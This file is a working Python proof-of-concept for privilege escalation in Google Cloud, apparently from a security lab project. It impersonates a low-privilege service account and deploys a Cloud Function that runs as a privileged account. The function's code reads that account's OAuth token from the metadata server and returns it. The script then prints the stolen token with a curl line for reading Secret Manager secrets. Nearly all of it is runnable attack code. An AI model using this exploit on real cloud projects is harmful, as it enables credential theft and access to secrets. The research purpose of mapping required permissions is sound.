#!/usr/bin/env python3
"""
PoC: gcp-cloudfunctions-001 privilege escalation via raw REST API (no gcloud CLI)

PURPOSE
-------
Proves that cloudfunctions.functions.get and resourcemanager.projects.get are
gcloud CLI mechanics -- NOT required by the underlying Cloud Functions v2 API.

PERMISSIONS USED BY THIS SCRIPT
--------------------------------
Required (core attack):
  - iam.serviceAccounts.actAs          on target_sa
  - cloudfunctions.functions.create    on project
  - cloudfunctions.functions.sourceCodeSet  on project
  - run.routes.invoke                  on Cloud Run service backing the function

Needed for deployment completion + URL discovery (see NOTE below):
  - cloudfunctions.operations.get      on project

Intentionally NOT called:
  - GET /v1/projects/{id}  (resourcemanager.projects.get) -- gcloud resolves
                            project ID unconditionally before any CF call
  - GET /v2/.../functions/{name}  (cloudfunctions.functions.get) -- gcloud
                            checks create-vs-update path before every deploy

NOTE: operations.get vs functions.get
  The raw API needs exactly ONE of these to (a) know when the function is
  deployed and (b) discover the generated Cloud Run URL:
    - operations.get: poll the LRO until done; URL is in the operation response
    - functions.get:  poll GetFunction until state=ACTIVE; URL is in serviceConfig.uri
  This PoC uses operations.get (mirrors the gcloud choice but skips the two other
  gcloud-only calls). Swapping to functions.get would prove operations.get
  unnecessary instead -- either way one of the two is a practical requirement.

USAGE
-----
  pip install google-auth requests
  python3 poc_raw_api.py \\
    --project pathfinding-labs \\
    --region us-central1 \\
    --starting-sa pl-prod-cf001-start@pathfinding-labs.iam.gserviceaccount.com \\
    --target-sa  pl-prod-cf001-target@pathfinding-labs.iam.gserviceaccount.com \\
    --function-name pl-cf001-poc-$(date +%s)

  Credentials: uses ADC (Application Default Credentials) from the environment.
  The ADC identity must hold roles/iam.serviceAccountTokenCreator on starting_sa
  (Terraform provisions this automatically for the deployer identity).
"""

import argparse
import io
import json
import sys
import time
import zipfile

try:
    import google.auth
    import google.auth.impersonated_credentials
    import google.auth.transport.requests
    import requests
except ImportError:
    print("Missing dependencies. Run: pip install google-auth requests", file=sys.stderr)
    sys.exit(1)

CF_V2 = "https://cloudfunctions.googleapis.com/v2"
IAM_CREDS = "https://iamcredentials.googleapis.com/v1"
SCOPES = ["https://www.googleapis.com/auth/cloud-platform"]
POLL_INTERVAL_SECONDS = 15


# ---------------------------------------------------------------------------
# Credential helpers
# ---------------------------------------------------------------------------

def _refresh(creds):
    creds.refresh(google.auth.transport.requests.Request())
    return creds.token


def impersonate_sa(source_creds, target_sa_email):
    creds = google.auth.impersonated_credentials.Credentials(
        source_credentials=source_creds,
        target_principal=target_sa_email,
        target_scopes=SCOPES,
    )
    _refresh(creds)
    return creds


def bearer(creds):
    """Return a fresh Authorization header dict."""
    return {
        "Authorization": f"Bearer {_refresh(creds)}",
        "Content-Type": "application/json",
    }


# ---------------------------------------------------------------------------
# Cloud Functions v2 API calls
# ---------------------------------------------------------------------------

def generate_upload_url(creds, project, location):
    """
    POST /v2/projects/{project}/locations/{location}/functions:generateUploadUrl
    Permission: cloudfunctions.functions.sourceCodeSet
    Returns (upload_url, storage_source) where storage_source is a dict with
    bucket/object/generation to embed in the CreateFunction request.
    """
    url = f"{CF_V2}/projects/{project}/locations/{location}/functions:generateUploadUrl"
    r = requests.post(url, headers=bearer(creds), json={})
    r.raise_for_status()
    data = r.json()
    return data["uploadUrl"], data["storageSource"]


def upload_zip(upload_url, zip_bytes):
    """
    PUT <presigned_url>
    No IAM required -- the presigned URL is issued by the Cloud Functions
    service agent (gcf-admin-robot), so no storage IAM on starting_sa needed.
    """
    r = requests.put(
        upload_url,
        data=zip_bytes,
        headers={"Content-Type": "application/zip"},
    )
    r.raise_for_status()


def create_function(creds, project, location, function_name, storage_source, target_sa_email):
    """
    POST /v2/projects/{project}/locations/{location}/functions?functionId={name}
    Permissions: cloudfunctions.functions.create + iam.serviceAccounts.actAs (on target_sa)

    SKIPS the GetFunction preflight that gcloud always performs.
    Returns an Operation (LRO).
    """
    parent = f"projects/{project}/locations/{location}"
    body = {
        "name": f"{parent}/functions/{function_name}",
        "buildConfig": {
            "runtime": "python312",
            "entryPoint": "exfil",
            "source": {"storageSource": storage_source},
            # Pin Cloud Build to target_sa to avoid needing actAs on the
            # Compute Engine default SA (same as --build-service-account in gcloud).
            "serviceAccount": f"projects/{project}/serviceAccounts/{target_sa_email}",
        },
        "serviceConfig": {
            "serviceAccountEmail": target_sa_email,
            "ingressSettings": "ALLOW_ALL",
        },
    }
    r = requests.post(
        f"{CF_V2}/{parent}/functions?functionId={function_name}",
        headers=bearer(creds),
        json=body,
    )
    r.raise_for_status()
    return r.json()


def poll_operation(creds, operation_name):
    """
    GET /v2/{operation_name}
    Permission: cloudfunctions.operations.get

    Polls until done=true, then returns the Function resource embedded in
    the operation's response field (which includes serviceConfig.uri).
    This avoids needing functions.get to discover the Cloud Run URL.
    """
    op_url = f"{CF_V2}/{operation_name}"
    print("    polling", end="", flush=True)
    while True:
        r = requests.get(op_url, headers=bearer(creds))
        r.raise_for_status()
        op = r.json()
        if op.get("done"):
            print(" done")
            if "error" in op:
                raise RuntimeError(
                    f"Deployment failed: {json.dumps(op['error'], indent=2)}"
                )
            return op["response"]  # Function resource (Any proto, camelCase keys)
        print(".", end="", flush=True)
        time.sleep(POLL_INTERVAL_SECONDS)


def mint_id_token(caller_creds, sa_email, audience):
    """
    POST /v1/projects/-/serviceAccounts/{sa}:generateIdToken
    Called with the deployer's credentials (caller_creds), which hold
    roles/iam.serviceAccountTokenCreator on starting_sa -- the same permission
    that gcloud uses when you pass --impersonate-service-account.
    """
    url = f"{IAM_CREDS}/projects/-/serviceAccounts/{sa_email}:generateIdToken"
    r = requests.post(
        url,
        headers=bearer(caller_creds),
        json={"audience": audience, "includeEmail": True},
    )
    r.raise_for_status()
    return r.json()["token"]


def invoke_function(id_token, function_url):
    """
    GET {function_url}
    Permission: run.routes.invoke

    Uses an OIDC identity token (not an access token) because gen2 functions
    authenticate via Cloud Run IAM, not the Cloud Functions API.
    """
    r = requests.get(function_url, headers={"Authorization": f"Bearer {id_token}"})
    r.raise_for_status()
    return r.json()


# ---------------------------------------------------------------------------
# Malicious function source
# ---------------------------------------------------------------------------

def build_function_zip():
    """
    In-memory zip of the function that reads its own OAuth token from the
    GCE metadata server and returns it in the HTTP response.
    """
    main_py = """\
import functions_framework
import urllib.request
import json

@functions_framework.http
def exfil(request):
    url = (
        "http://metadata.google.internal"
        "/computeMetadata/v1/instance/service-accounts/default/token"
    )
    req = urllib.request.Request(url, headers={"Metadata-Flavor": "Google"})
    token_data = json.loads(urllib.request.urlopen(req).read())
    return json.dumps(token_data), 200, {"Content-Type": "application/json"}
"""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("main.py", main_py)
        zf.writestr("requirements.txt", "functions-framework==3.*\n")
    buf.seek(0)
    return buf.read()


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    ap = argparse.ArgumentParser(
        description="PoC: gcp-cloudfunctions-001 via raw API (proves gcloud-only permissions are avoidable)"
    )
    ap.add_argument("--project", required=True, help="GCP project ID")
    ap.add_argument("--region", required=True, help="Cloud Functions region (e.g. us-central1)")
    ap.add_argument("--starting-sa", required=True, help="starting SA email (attacker identity)")
    ap.add_argument("--target-sa", required=True, help="target SA email (privileged identity)")
    ap.add_argument("--function-name", required=True, help="Name for the new Cloud Function")
    args = ap.parse_args()

    print("=" * 62)
    print("PoC: gcp-cloudfunctions-001 (raw REST API, no gcloud CLI)")
    print("=" * 62)
    print()
    print("Permissions NOT used (gcloud-only mechanics):")
    print("  resourcemanager.projects.get  -- skipped entirely")
    print("  cloudfunctions.functions.get  -- skipped entirely")
    print()

    # ------------------------------------------------------------------
    # 1. Authenticate: ADC -> impersonate starting_sa
    # ------------------------------------------------------------------
    print("[1] Loading ADC credentials and impersonating starting_sa...")
    base_creds, _ = google.auth.default(scopes=SCOPES)
    sa_creds = impersonate_sa(base_creds, args.starting_sa)
    print(f"    deployer (ADC): {getattr(base_creds, 'service_account_email', None) or 'user account'}")
    print(f"    starting_sa: {args.starting_sa}")
    print()

    # ------------------------------------------------------------------
    # 2. Generate upload URL  (cloudfunctions.functions.sourceCodeSet)
    # ------------------------------------------------------------------
    print("[2] Generating upload URL...")
    print(f"    POST {CF_V2}/projects/{args.project}/locations/{args.region}/functions:generateUploadUrl")
    print(f"    permission: cloudfunctions.functions.sourceCodeSet")
    print(f"    NOTE: project ID used directly -- no resourcemanager.projects.get call")
    upload_url, storage_source = generate_upload_url(sa_creds, args.project, args.region)
    print(f"    storageSource.bucket: {storage_source.get('bucket')}")
    print()

    # ------------------------------------------------------------------
    # 3. Build + upload function zip (no IAM -- presigned URL)
    # ------------------------------------------------------------------
    print("[3] Building malicious function source and uploading...")
    zip_bytes = build_function_zip()
    upload_zip(upload_url, zip_bytes)
    print(f"    Uploaded {len(zip_bytes)} bytes to presigned URL (no storage IAM needed)")
    print()

    # ------------------------------------------------------------------
    # 4. Create function  (functions.create + actAs on target_sa)
    # ------------------------------------------------------------------
    print("[4] Creating function (no GetFunction preflight)...")
    print(f"    POST {CF_V2}/projects/{args.project}/locations/{args.region}/functions")
    print(f"    permissions: cloudfunctions.functions.create + iam.serviceAccounts.actAs")
    print(f"    NOTE: gcloud calls GetFunction here to check create-vs-update -- we skip it")
    operation = create_function(
        sa_creds, args.project, args.region,
        args.function_name, storage_source, args.target_sa,
    )
    op_name = operation["name"]
    print(f"    LRO: {op_name}")
    print()

    # ------------------------------------------------------------------
    # 5. Poll LRO until done  (cloudfunctions.operations.get)
    #    URL is extracted from the operation result -- no functions.get needed
    # ------------------------------------------------------------------
    print("[5] Polling LRO for completion...")
    print(f"    GET {CF_V2}/{op_name}")
    print(f"    permission: cloudfunctions.operations.get")
    print(f"    NOTE: URL comes from operation result -- no cloudfunctions.functions.get needed")
    function_resource = poll_operation(sa_creds, op_name)
    function_url = function_resource.get("serviceConfig", {}).get("uri")
    if not function_url:
        print(f"    Full operation response: {json.dumps(function_resource, indent=2)}", file=sys.stderr)
        print("ERROR: could not extract serviceConfig.uri from operation response", file=sys.stderr)
        sys.exit(1)
    print(f"    Cloud Run URL: {function_url}")
    print()

    # ------------------------------------------------------------------
    # 6. Mint OIDC identity token for invocation
    # ------------------------------------------------------------------
    print("[6] Minting OIDC identity token for Cloud Run invocation...")
    # Use base_creds (deployer, who holds serviceAccountTokenCreator on starting_sa)
    # to call generateIdToken on behalf of starting_sa -- same as what gcloud does
    # with --impersonate-service-account.
    id_token = mint_id_token(base_creds, args.starting_sa, function_url)
    print(f"    Identity token obtained (audience: {function_url})")
    print()

    # ------------------------------------------------------------------
    # 7. Invoke function  (run.routes.invoke)
    # ------------------------------------------------------------------
    print("[7] Invoking function...")
    print(f"    GET {function_url}")
    print(f"    permission: run.routes.invoke")
    result = invoke_function(id_token, function_url)
    access_token = result.get("access_token", "")
    token_type = result.get("token_type", "")
    expires_in = result.get("expires_in", "")
    print(f"    token_type:  {token_type}")
    print(f"    expires_in:  {expires_in}s")
    print(f"    access_token: {access_token[:20]}...{access_token[-10:] if len(access_token) > 30 else ''}")
    print()

    # ------------------------------------------------------------------
    # 8. Summary
    # ------------------------------------------------------------------
    if access_token:
        print("=" * 62)
        print("SUCCESS: privilege escalation demonstrated")
        print()
        print("Permissions used:")
        print("  [required]  iam.serviceAccounts.actAs")
        print("  [required]  cloudfunctions.functions.create")
        print("  [required]  cloudfunctions.functions.sourceCodeSet")
        print("  [required]  run.routes.invoke")
        print("  [practical] cloudfunctions.operations.get  (LRO polling)")
        print()
        print("Permissions NOT used (gcloud-only mechanics):")
        print("  [skipped]   resourcemanager.projects.get")
        print("  [skipped]   cloudfunctions.functions.get")
        print()
        print("To use the exfiltrated token:")
        print(f"  export STOLEN_TOKEN='{access_token}'")
        print(f"  curl -H \"Authorization: Bearer $STOLEN_TOKEN\" \\")
        print(f"    https://secretmanager.googleapis.com/v1/projects/{args.project}/secrets/.../versions/latest:access")
        print("=" * 62)
    else:
        print("ERROR: function returned no access_token", file=sys.stderr)
        print(f"Full response: {json.dumps(result, indent=2)}", file=sys.stderr)
        sys.exit(1)


if __name__ == "__main__":
    main()
